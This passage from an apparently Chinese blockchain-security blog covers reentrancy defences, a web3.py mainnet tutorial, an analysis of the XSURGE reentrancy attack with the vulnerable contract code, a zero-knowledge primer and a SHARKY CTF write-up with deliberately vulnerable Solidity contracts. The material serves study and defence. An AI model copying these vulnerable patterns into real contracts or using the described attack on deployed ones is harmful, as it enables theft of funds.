<li><p>向address发送amount数量的Wei（注意单位），如果执行失败则throw。发送的同时传输2300gas，gas数量不可调整</p>
</li>
</ul>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">msg</span><span class="selector-class">.sender</span><span class="selector-class">.send</span>(<span class="selector-tag">amount</span>);</span><br><span class="line"><span class="selector-tag">mag</span><span class="selector-class">.sender</span><span class="selector-class">.transfer</span>(<span class="selector-tag">amount</span>);</span><br></pre></td></tr></table></figure>
<ol>
<li>采用checks-effects-interactions模式</li>
</ol>
<p>把对余额的操作放在转账之前</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">balances[msg.sender] -= amount<span class="comment">;</span></span><br><span class="line">msg.sender.call.value(amount)()<span class="comment">;  </span></span><br></pre></td></tr></table></figure>
<p>这样，每次攻击者想要提现都必须先执行余额变动操作，就无法实现重入了</p>
<ol>
<li>使用互斥锁</li>
</ol>
<p>该攻击的关键在于合约的withdraw函数无法完整的执行，停停留在call层面，如果我们能让其的执行变成一个整体，就像mysql的事务一样，就可以有效防止重入。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">require</span>(!locked, <span class="string">&quot;Reentrant call detected!&quot;</span>);</span><br><span class="line">  locked = <span class="literal">true</span>;</span><br><span class="line">  ...</span><br><span class="line">  locked = <span class="literal">false</span>;</span><br></pre></td></tr></table></figure>
<p>把我们需要执行的代码插入其中，就能保证每次执行是一次完整的。</p>
<ol>
<li>使用OpenZeppelin官方的<a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol">ReentrancyGuard合约</a></li>
</ol>
<p>OpenZeppelin官方在ReentrancyGuard合约中定义了nonReentrant函数修饰词，可以在关键函数中使用，防止重入</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">modifier <span class="function"><span class="title">nonReentrant</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="comment">// On the first call to nonReentrant, _notEntered will be true</span></span><br><span class="line">        <span class="built_in">require</span>(_status != _ENTERED, <span class="string">&quot;ReentrancyGuard: reentrant call&quot;</span>);</span><br><span class="line">        <span class="comment">// Any calls to nonReentrant after this point will fail</span></span><br><span class="line">        _status = _ENTERED;</span><br><span class="line">        _;</span><br><span class="line">        <span class="comment">// By storing the original value once again, a refund is triggered (see</span></span><br><span class="line">        <span class="comment">// https://eips.ethereum.org/EIPS/eip-2200)</span></span><br><span class="line">        _status = _NOT_ENTERED;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>与互斥锁的思想差不多，但是其官方将其封装成函数修饰词使用</p>
<ol>
<li>采用pull payment模式<a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/PullPayment.sol">PullPayment合约</a></li>
</ol>
<p>其核心的思想是不直接将资金发送给接受者，而是每一笔交易去新建一个合约，由接受者自己去提取。</p>
<h1 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h1><p>合约在开发过程中，使用了危险的函数，并且使用不安全的交互模式。两者叠加在一起造就了以太坊非常经典的重入漏洞。其中最有代表性的攻击 The Dao<br>分析报告：<a href="https://hackingdistributed.com/2016/06/18/analysis-of-the-dao-exploit/">Analysis of the DAO exploit</a></p>
]]></content>
      <categories>
        <category>区块链安全</category>
      </categories>
      <tags>
        <tag>区块链安全</tag>
        <tag>智能合约安全</tag>
      </tags>
  </entry>
  <entry>
    <title>如何与以太坊交互</title>
    <url>/2021/07/29/23/</url>
    <content><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>​    学习区块链有一段时间了，一直有一个绕不开的点，如何与以太坊的公链进行交互。但是一直没有在网上找到合适的解决方案，大部分的教程都是与本地部署的私链交互，有一些的教程给出的脚本自己实践多次失败。前段时间积极探索实践出来，写一篇教程总结一下。</p>
<h1 id="0x02-前期准备"><a href="#0x02-前期准备" class="headerlink" title="0x02 前期准备"></a>0x02 前期准备</h1><p>环境准备，有一些容易安装失败的会介绍教程</p>
<h2 id="Python3-WEB3库"><a href="#Python3-WEB3库" class="headerlink" title="Python3  WEB3库"></a>Python3  WEB3库</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><p>复现一些区块链的题目时，遇到了在window下无法使用Python Web3库的问题，搜索不到合适的解决方案</p>
<p><img src="/2021/07/29/23/image-20210622220300703.png" alt="image-20210622220300703"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 -m pip install --upgrade pip</span><br><span class="line">pip install web3//记得换源</span><br></pre></td></tr></table></figure>
<p>会遇到第一个错误</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Microsoft</span> Visual C++ <span class="number">14</span>.<span class="number">0</span> is required.</span><br></pre></td></tr></table></figure>
<p><a href="https://zhuanlan.zhihu.com/p/165008313">解决方法</a></p>
<p><img src="/2021/07/29/23/image-20210623114837107.png" alt="image-20210623114837107"></p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">pip <span class="keyword">install</span> cytoolz</span><br></pre></td></tr></table></figure>
<p>继续安装，因为我的错误和不太一样，win10虚拟机复现没有成功</p>
<p><img src="/2021/07/29/23/image-20210623120329820.png" alt="image-20210623120329820"></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sha3</span> pip install pysha<span class="number">3</span></span><br><span class="line"><span class="attribute">z3</span> pip isnatll z<span class="number">3</span>-solver</span><br></pre></td></tr></table></figure>
<p>遇到明明安装了某个库，却无法引用，多试试点带py前缀的库</p>
<h3 id="Macos-Ubantu"><a href="#Macos-Ubantu" class="headerlink" title="Macos/Ubantu"></a>Macos/Ubantu</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line">pip3 install web3</span><br></pre></td></tr></table></figure>
<p>暂时没有遇到问题</p>
<h2 id="IDE"><a href="#IDE" class="headerlink" title="IDE"></a>IDE</h2><p>都可以，不论是vscode还是pycharm，或者其他的一些都可以</p>
<h2 id="Infura"><a href="#Infura" class="headerlink" title="Infura"></a>Infura</h2><p>Infura提供免费的以太坊节点RPC API服务、IPFS API服务以及整合了多个数字货币交易所数据的加密货币行情信息API服务。<br>Infura是一个托管的以太坊节点集群,可以将你编写的以太坊智能合约部署到infura提供的节点上,而无需自己搭建以太坊节点。</p>
<p>注册infura，之后新建免费的工程。进入之后在setting页面得到我们需要的</p>
<ul>
<li>PROJECT ID</li>
<li>PROJECT SECRET</li>
</ul>
<p><img src="/2021/07/29/23/截屏2021-07-29 16.32.46.png" alt="截屏2021-07-29 16.32.46"></p>
<h2 id="设置全局变量"><a href="#设置全局变量" class="headerlink" title="设置全局变量"></a>设置全局变量</h2><p>编辑你的shell的配置文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim .zshrc</span><br><span class="line">vim .bashrc</span><br><span class="line">//视个人情况而定</span><br></pre></td></tr></table></figure>
<p>加入以下内容，注意替换，不需要加引号</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export WEB3_INFURA_API_KEY=PROJECT SECRET</span><br><span class="line">export WEB3_INFURA_PROJECT_ID=PROJECT_ID</span><br></pre></td></tr></table></figure>
<h1 id="0x03-连接主网"><a href="#0x03-连接主网" class="headerlink" title="0x03 连接主网"></a>0x03 连接主网</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> web3.auto.infura <span class="keyword">import</span> *</span><br><span class="line">print(w3.isConnected())</span><br><span class="line">➜  python python3 ./<span class="number">7.</span>py</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure>
<p>如需要切换其他测试网络</p>
<p><img src="/2021/07/29/23/image-20210729164947421.png" alt="image-20210729164947421"></p>
<h1 id="0x04-简单验证一下"><a href="#0x04-简单验证一下" class="headerlink" title="0x04 简单验证一下"></a>0x04 简单验证一下</h1><p>我的想法是找一个以太坊账户，查询一下余额，如果与区块链浏览器上面的相符，就代表正确，随便找一个<a href="https://etherscan.io/address/0xe206e3DCa498258f1B7EEc1c640B5AEE7BB88Fd0">账户</a></p>
<p><img src="/2021/07/29/23/image-20210729165248919.png" alt="image-20210729165248919">      <del>400多ETH啊，什么时候我也能拥有，直接财富自由</del></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(w3.eth.getBalance(<span class="string">&#x27;0xe206e3DCa498258f1B7EEc1c640B5AEE7BB88Fd0&#x27;</span>))</span><br><span class="line">//➜  python python3 ./<span class="number">7.</span>py</span><br><span class="line"><span class="number">423173643972433865216</span></span><br><span class="line">//➜  python python3 ./<span class="number">7.</span>py</span><br><span class="line"><span class="number">395736143975672866293</span></span><br></pre></td></tr></table></figure>
<p>好家伙两次查的还不一样，回来再看一下</p>
<p><img src="/2021/07/29/23/截屏2021-07-29 17.03.40.png" alt="截屏2021-07-29 17.03.40"></p>
<p>它转走了？我只是查询了一下你的余额，你就感觉到了危险？即使转移资产？</p>
<p>回归正题，395736143975672866293与395<strong>.</strong>736143975672866293 Ether刚好能对应，所以我们正确的连接上了主网！！！</p>
<h1 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h1><p>成功的一刻感动的不得了。更多功能自己探索吧！</p>
]]></content>
      <categories>
        <category>区块链安全</category>
      </categories>
      <tags>
        <tag>区块链安全</tag>
        <tag>以太坊交互</tag>
      </tags>
  </entry>
  <entry>
    <title>XSURGE 闪电贷攻击事件简单分析</title>
    <url>/2021/08/19/24/</url>
    <content><![CDATA[<h1 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h1><p>8 月 17 日，有消息爆出 BSC 上 DeFi 协议 XSURGE 遭到闪电贷攻击，被盗金额价值 500 万美金。对此展开漏洞原理的分析。</p>
<p><img src="/2021/08/19/24/640.png" alt="图片"></p>
<h1 id="0x02-交易追踪"><a href="#0x02-交易追踪" class="headerlink" title="0x02 交易追踪"></a>0x02 交易追踪</h1><p><a href="https://bscscan.com/tx/0x7e2a6ec08464e8e0118368cb933dc64ed9ce36445ecf9c49cacb970ea78531d2">攻击交易信息</a></p>
<p>攻击交易截图</p>
<p><img src="/2021/08/19/24/image-20210818174143280.png" alt="image-20210818174143280"></p>
<p><img src="/2021/08/19/24/截屏2021-08-18 17.42.05.png" alt="截屏2021-08-18 17.42.05"></p>
<p>截止事件分析时，该地址已经被标记为XSUGRE Hack</p>
<p>本以为只是一起简单的闪电贷套利攻击，在分析交易数额发现似乎不是那么回事，尝试对合约进行分析，在浏览器上找到了合约的<a href="https://bscscan.com/address/0xe1e1aa58983f6b8ee8e4ecd206cea6578f036c21#code">源码</a></p>
<h1 id="0x03-源码分析"><a href="#0x03-源码分析" class="headerlink" title="0x03 源码分析"></a>0x03 源码分析</h1><p>好家伙，分析源码发现居然是重入攻击，牛的牛的。咱一步一步来看</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/** Sells SURGE Tokens And Deposits the BNB into Seller&#x27;s Address */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sell</span>(<span class="params">uint256 tokenAmount</span>) <span class="title">public</span> <span class="title">nonReentrant</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    </span><br><span class="line">    address seller = msg.sender;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// make sure seller has this balance</span></span><br><span class="line">    <span class="built_in">require</span>(_balances[seller] &gt;= tokenAmount, <span class="string">&#x27;cannot sell above token amount&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// calculate the sell fee from this transaction</span></span><br><span class="line">    uint256 tokensToSwap = tokenAmount.mul(sellFee).div(<span class="number">10</span>**<span class="number">2</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// how much BNB are these tokens worth?</span></span><br><span class="line">    uint256 amountBNB = tokensToSwap.mul(calculatePrice());</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// send BNB to Seller</span></span><br><span class="line">    (bool successful,) = payable(seller).call&#123;<span class="attr">value</span>: amountBNB, <span class="attr">gas</span>: <span class="number">40000</span>&#125;(<span class="string">&quot;&quot;</span>); </span><br><span class="line">    <span class="keyword">if</span> (successful) &#123;</span><br><span class="line">        <span class="comment">// subtract full amount from sender</span></span><br><span class="line">        _balances[seller] = _balances[seller].sub(tokenAmount, <span class="string">&#x27;sender does not have this amount to sell&#x27;</span>);</span><br><span class="line">        <span class="comment">// if successful, remove tokens from supply</span></span><br><span class="line">        _totalSupply = _totalSupply.sub(tokenAmount);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        revert();</span><br><span class="line">    &#125;</span><br><span class="line">    emit Transfer(seller, address(<span class="built_in">this</span>), tokenAmount);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>函数功能分析</p>
<ul>
<li>检查卖家售卖的余额是否小于等于卖家持有的金额</li>
<li>计算售卖的费率并扣除</li>
<li>发送剩余的款项</li>
<li>更新卖家的状态</li>
<li>记录事件</li>
</ul>
<p>重点在这行代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(bool successful,) &#x3D; payable(seller).call&#123;value: amountBNB, gas: 40000&#125;(&quot;&quot;); </span><br></pre></td></tr></table></figure>
<p>使用call函数发送代币，还给了40000gas，更为关健的是未使用checks-effects-interactions模式。这不妥妥的给你安排，但是sell函数函数有nonReentrant关键词修饰，来看一下它的定义</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">abstract contract ReentrancyGuard &#123;</span><br><span class="line">    uint256 private constant _NOT_ENTERED = <span class="number">1</span>;</span><br><span class="line">    uint256 private constant _ENTERED = <span class="number">2</span>;</span><br><span class="line">    uint256 private _status;</span><br><span class="line">    <span class="title">constructor</span> (<span class="params"></span>) &#123;</span><br><span class="line">        _status = _NOT_ENTERED;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier <span class="function"><span class="title">nonReentrant</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="built_in">require</span>(_status != _ENTERED, <span class="string">&quot;ReentrancyGuard: reentrant call&quot;</span>);</span><br><span class="line">        _status = _ENTERED;</span><br><span class="line">        _;</span><br><span class="line">        _status = _NOT_ENTERED;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>关键字功能分析</p>
<ul>
<li><p>检查_status是否不等于_ENTERED</p>
</li>
<li><p>先定义_status状态为_ENTERED</p>
</li>
<li>执行被修饰函数主体</li>
<li>更改_status状态为_NOT_ENTERED</li>
</ul>
<p>可以看到nonReentrant可以很好的防御重入攻击，显然我们没有办法二次调用sell函数。是不是会有点可惜，没有办法攻击了。我们再来看另一个函数</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">purchase</span>(<span class="params">address buyer, uint256 bnbAmount</span>) <span class="title">internal</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// make sure we don&#x27;t buy more than the bnb in this contract</span></span><br><span class="line">    <span class="built_in">require</span>(bnbAmount &lt;= address(<span class="built_in">this</span>).balance, <span class="string">&#x27;purchase not included in balance&#x27;</span>);</span><br><span class="line">    <span class="comment">// previous amount of BNB before we received any        </span></span><br><span class="line">    uint256 prevBNBAmount = (address(<span class="built_in">this</span>).balance).sub(bnbAmount);</span><br><span class="line">    <span class="comment">// if this is the first purchase, use current balance</span></span><br><span class="line">    prevBNBAmount = prevBNBAmount == <span class="number">0</span> ? address(<span class="built_in">this</span>).balance : prevBNBAmount;</span><br><span class="line">    <span class="comment">// find the number of tokens we should mint to keep up with the current price</span></span><br><span class="line">    uint256 nShouldPurchase = hyperInflatePrice ? _totalSupply.mul(bnbAmount).div(address(<span class="built_in">this</span>).balance) : _totalSupply.mul(bnbAmount).div(prevBNBAmount);</span><br><span class="line">    <span class="comment">// apply our spread to tokens to inflate price relative to total supply</span></span><br><span class="line">    uint256 tokensToSend = nShouldPurchase.mul(spreadDivisor).div(<span class="number">10</span>**<span class="number">2</span>);</span><br><span class="line">    <span class="comment">// revert if under 1</span></span><br><span class="line">    <span class="keyword">if</span> (tokensToSend &lt; <span class="number">1</span>) &#123;</span><br><span class="line">        revert(<span class="string">&#x27;Must Buy More Than One Surge&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// mint the tokens we need to the buyer</span></span><br><span class="line">    mint(buyer, tokensToSend);</span><br><span class="line">    emit Transfer(address(<span class="built_in">this</span>), buyer, tokensToSend);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>函数功能分析</p>
<ul>
<li>购买量不能超过本合约持有量</li>
<li>被购买后剩余持有量是否为零</li>
<li>计算可以兑换的Surge数量</li>
<li>给目标账户增发Surge</li>
<li>记录事件</li>
</ul>
<p>在看一个函数</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">receive() external payable &#123;</span><br><span class="line">        uint256 val = msg.value;</span><br><span class="line">        address buyer = msg.sender;</span><br><span class="line">        purchase(buyer, val);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>经过上面的分析，我们没有办法实现二次sell，但是我们可以调用purchase函数啊，purchase函数未被nonReentrant修饰，显然我们可以在攻击合约的fallback函数中去调用受害合约的receive()函数从而调用purchase函数，此时攻击账户的信息还没有更新，我们就可以实现购买，相当于我们把钱花出去了，但是账户的余额没有更新，我们进行售卖的时候，受害合约依旧会给我们转账。</p>
<h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>没有想到多年以后还会有重入漏洞出现，这次是以另一种形式。如果开始者不使用call或者限定为较少的gas，那么这次的攻击事件就不会发生。</p>
<p>修复建议：</p>
<ul>
<li>使用安全代币发送函数如tansfer</li>
<li>限制call的gas仅能支持一次转账</li>
<li>限制参与的用户不为合约账户</li>
</ul>
<p>安全建议：</p>
<ul>
<li>在项目上线之前，找专业的第三方安全企业进行全面的安全审计，而且可以找多家进行交叉审计；</li>
<li>可以发布漏洞赏金计划，发送社区白帽子帮助找问题，先于黑客找到漏洞；</li>
<li>加强对项目的安全监测和预警，尽量做到在黑客发动攻击之前发布预警从而保护项目安全。</li>
</ul>
<p>另外，今年BSC链上的合约屡屡遭受闪电贷攻击，对整个DEFI生态造成了严重的影响。</p>
]]></content>
      <categories>
        <category>区块链安全</category>
      </categories>
      <tags>
        <tag>区块链安全</tag>
        <tag>攻击事件追踪</tag>
      </tags>
  </entry>
  <entry>
    <title>零知识证明初探</title>
    <url>/2021/08/31/25/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>​    零知识证明技术是现代密码学三大基础之一，由 S.Goldwasser、S.Micali 及 C.Rackoff 在 20 世纪 80 年代初提出。早期的零知识证明由于其效率和可用性等限制，未得到很好的利用，仅停留在理论层面。直到近年来，零知识证明的理论研究才开始不断突破，同时区块链也为零知识证明创造了大展拳脚的机会，因而走进大众视野。</p>
<h1 id="数独的故事"><a href="#数独的故事" class="headerlink" title="数独的故事"></a>数独的故事</h1><p>​    数独大家都很熟悉， 玩家需要根据9×9盘面上的已知数字，推理出所有剩余空格的数字，并</p>
<blockquote>
<p>满足每一行、每一列、每一个粗线宫（3*3）内的数字均含1-9，不重复 。<br>——以下简称数独规则</p>
</blockquote>
<p>​    数独盘面是个九宫，每一宫又分为九个小格。 在这八十一格中给出一定的已知数字和解题条件，利用逻辑和推理，在其他的空格上填入1-9的数字。<br>​    现在有一个问题，假如我知道某个数独的答案，如何向张三证明我有答案。<br>​    诚然，最简单的方法是把答案给张三看。张三就能通过校验来判断我是否有答案。但是这带来一个风险，如果我和张三之间存在交易，张三知道答案之后不愿意付相应的报酬，这就会对我产生损失。这就带来另外一个问题。<br>​    如何在不给张三看答案的情况下，证明我有答案。<br>​    简单建立一个思路，给张三直接看答案也是让其检验答案满足数独规则，如果能够证明我的数独满足规则，也就间接证明我有答案。所以我把多个完整的数独拆分成九行，九列，九个九宫格，然后打乱装进袋子里。<br>​    然后让张三选择验证行，验证列，验证九宫格。张三选择按照行来验证，他打开九个袋子，发现上面的数字都满足数独规则。此时张三发现，我可以刻意构造一种满足的序列来欺骗他。我急忙解释：但是我事先不知道你会选择行还是选择列抑或是九宫格。张三要求多次验证，经过多次验证，发现我提供的都满足数独规则，张三将信将疑的选择相信我有数独的答案。<br>​    当然，细推上面的故事，会发现很多漏洞，比如</p>
<blockquote>
<p>张三可以根据其中的一个正确答案去反推出他需要的答案，只要知道的数字足够，完完全全可以降低推理的难度。<br>我也可以伪造一个完全不是该数独的答案，以此来蒙骗张三。</p>
</blockquote>
<p>​    这些并不是重点，重点在于这个故事可以让大家对<strong>零知识证明</strong>有一个大致的印象。零知识证明的本质就是在不揭晓我所知道或拥有的某样东西的前提下，向别人<strong>证明</strong>我有<strong>很大几率</strong>确实知道或拥有这个东西。<br>​    这点和某些加密算法的思想很类似，RSA的公钥破解在理论上是可行的，但是在现实中被破解的概率非常小就能保证该密码算法的安全性。再比如哈希算法，一定存在多个输入对应一个输出，但是在现实中我们很难找到第二个输入去对应一个已知的输出。这难道就是概率学？</p>
<h1 id="地图三着色问题"><a href="#地图三着色问题" class="headerlink" title="地图三着色问题"></a>地图三着色问题</h1><p>​    三色问题是如何用三种颜色染色一个地图，保证任意两个相邻的地区都是不同的颜色。我们把这个地图三染色问题转变成一个连通图的顶点三染色问题，假设每个地区都有一个首府(节点)，然后把相邻的节点连接起来，这样地图染色问题可以变成一个连通图的顶点染色问题。<br>​    下面的问题就是已知一个确定的连通图，如何不公布结果的情况下证明我知道染色的方案。假设连通图是下图所示</p>
<p>​                                                    <img src="/2021/08/31/25/0fef5f44a0e04f4ab3dc483a3ee09ffe.png" alt="img"><br>​    如果你曾经看过任何加密相关文章，你可能知道，解决这种困境的正确方法，就是想出一个绝对疯狂的技术手段 。<br>​    用帽子🎩！！！<br>​    下面简述运作原理，我在一张空白的纸上画出带有着色方案的连通图，然后在每个节点上面盖上帽子。此时的张三并允许选择任意一条边，我就会将改边对应的两个顶点的帽子揭开展示给张三看，确实是不同的颜色。这也只能证明我可能没有撒谎。张三认为他只进行了一轮的观察，不足以完全相信我。假设有E条边，张三受骗的概率[(E-1)/E] * [(E-1)/E]，这是非常高的。所以需要多次验证，保证受骗的概率降到极低。经过E^2验证之后，可以将受骗概率降到极低。当然每一次验证我都会随机更换成另外三种颜色，防止张三通过验证前后串起来从而得到所有的答案。一个据此设计的在线<a href="http://web.mit.edu/~ezyang/Public/graph/svg.html">demo</a><br>​    但是你可能会有疑问，这个问题似乎没有什么现实的意义。让我们来一步一步探索。<br>​    地图三着色问题属于<a href="(http://en.wikipedia.org/wiki/NP_(complexity">NP问题</a>)(非确定性多项式难题)，是指一个复杂问题不能确定是否在多项式时间内找到答案，但是可以在多项式时间内验证答案是否正确。最有趣的地方再有三色问题是一个NPC(Non-deterministic Polynomial Complete)问题。<br>​    建议阅读这篇<a href="https://blog.csdn.net/qq_29176963/article/details/82776543">文章</a>，也就是说我们任何其他属于这一类的NP问题都可以转化为这个问题的实例。那在现实什么问题属于这类NP问题呢，比如分配蜂窝网格，要求每两个电塔不具有相同波段，避免信号📶干扰，但是电塔只允许传播三种波段的信号，此时我们就可以转化为上述的三色问题进行解决。更多有趣的内容在<a href="http://people.csail.mit.edu/silvio/Selected%20Scientific%20Papers/Zero%20Knowledge/Proofs_That_Yield_Nothing_But_Their_Validity_or_All_Languages_in_NP_Have_Zero-Knowledge_Proof_Systems.pdf">论文</a></p>
<h1 id="P-NP？"><a href="#P-NP？" class="headerlink" title="P=NP？"></a>P=NP？</h1><blockquote>
<p>证明P=NP同时也是<a href="https://zh.wikipedia.org/wiki/千禧年大奖难题">千禧年大奖难题</a>之一 </p>
</blockquote>
<p>NPC问题存在着一个令人惊讶的性质，即如果一个NPC问题存在多项式时间的算法，则所有的NP问题都可以在多项式时间内求解，即P=NP成立！！目前已经发现3000+的NPC问题。</p>
<h1 id="三个性质"><a href="#三个性质" class="headerlink" title="三个性质"></a>三个性质</h1><ul>
<li><p>完整性(completeness)：V无法欺骗P。若P知道一个定理的证明方法，则P使V以绝对优势的概率相信他能证明。</p>
</li>
<li><p>可靠性(Soundness)：P无法欺骗V。换言之，若P不知道一个定理的证明方法，则P使V相信他会证明定理的概率很低。</p>
</li>
<li><p>零知识性(Zero-knowledgeness)：V无法获取任何额外的知识。</p>
</li>
</ul>
<p>​    一个完备的零知识证明需要同时具备以上三种性质。其实也对应来三大难点，需要设计出能满足证明的方法，证明者在证明过程中不能作弊(方法不存在可以利用的缺陷或漏洞)，验证者无法在证明过程中获取被证明对象的部分或完整内容(对证明者形成威胁)。</p>
]]></content>
      <categories>
        <category>零知识证明</category>
      </categories>
      <tags>
        <tag>零知识证明</tag>
      </tags>
  </entry>
  <entry>
    <title>SHARKY CTF BLOCKCHAIN</title>
    <url>/2021/09/10/27/</url>
    <content><![CDATA[<h1 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h1><p>复现一下SHARKY CTF BLOCKCHAIN的赛题，提升一下自己</p>
<h1 id="0x02-WARMUP"><a href="#0x02-WARMUP" class="headerlink" title="0x02 WARMUP"></a>0x02 WARMUP</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pragma solidity &#x3D; 0.4.25;</span><br><span class="line"> </span><br><span class="line">contract Warmup &#123;</span><br><span class="line">    bool public locked;</span><br><span class="line">     </span><br><span class="line">    constructor() public payable &#123;</span><br><span class="line">        locked &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    function unlock() public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 0.005 ether);</span><br><span class="line">        locked &#x3D; false;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    function withdraw() public payable &#123;</span><br><span class="line">        require(!locked);</span><br><span class="line">        msg.sender.call.value(address(this).balance)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Just a warmup challenge, this need us to deloy the contract on remix and invoke the unlock function with 0.005 ether to put unlock to false, so that we can invoke withdraw() to get flag~</p>
<p>这个很简单，先调用unlock函数，再调用withdraw函数就可以了</p>
<h1 id="0x03-LOGIC"><a href="#0x03-LOGIC" class="headerlink" title="0x03 LOGIC"></a>0x03 LOGIC</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pragma solidity &#x3D; 0.4.25;</span><br><span class="line"> </span><br><span class="line">contract Logic &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    bytes32 private passphrase &#x3D; &quot;th3 fl4g 1s n0t h3r3&quot;;</span><br><span class="line">     </span><br><span class="line">    constructor() public payable &#123;</span><br><span class="line">        owner &#x3D; msg.sender;  </span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; owner);</span><br><span class="line">        msg.sender.call.value(address(this).balance)();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function claim(bytes32 _secret) public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 0.05 ether &amp;&amp; _secret &#x3D;&#x3D; passphrase);</span><br><span class="line">        owner &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Same as warmup, we should steal all money~</p>
<p>读取一下通过浏览器passphrase即可</p>
<p><img src="/2021/09/10/27/image-20210908182212140.png" alt="image-20210908182212140"></p>
<h1 id="0x04-GUESSING"><a href="#0x04-GUESSING" class="headerlink" title="0x04 GUESSING"></a>0x04 GUESSING</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pragma solidity &#x3D; 0.4.25;</span><br><span class="line"> </span><br><span class="line">contract Guessing &#123;</span><br><span class="line">    address public owner;    </span><br><span class="line">    bytes32 private passphrase;</span><br><span class="line">     </span><br><span class="line">    constructor(bytes32 _passphrase) public payable &#123;</span><br><span class="line">        owner &#x3D; msg.sender;</span><br><span class="line">        passphrase &#x3D; keccak256(abi.encodePacked(_passphrase));</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; owner);</span><br><span class="line">        msg.sender.call.value(address(this).balance)();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function claim(bytes32 _secret) public payable &#123;</span><br><span class="line">        require(keccak256(abi.encodePacked(_secret)) &#x3D;&#x3D; passphrase);</span><br><span class="line">        owner &#x3D; msg.sender; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>依旧和上一题差不多</p>
<p><img src="/2021/09/10/27/image-20210908182847638.png" alt="image-20210908182847638"></p>
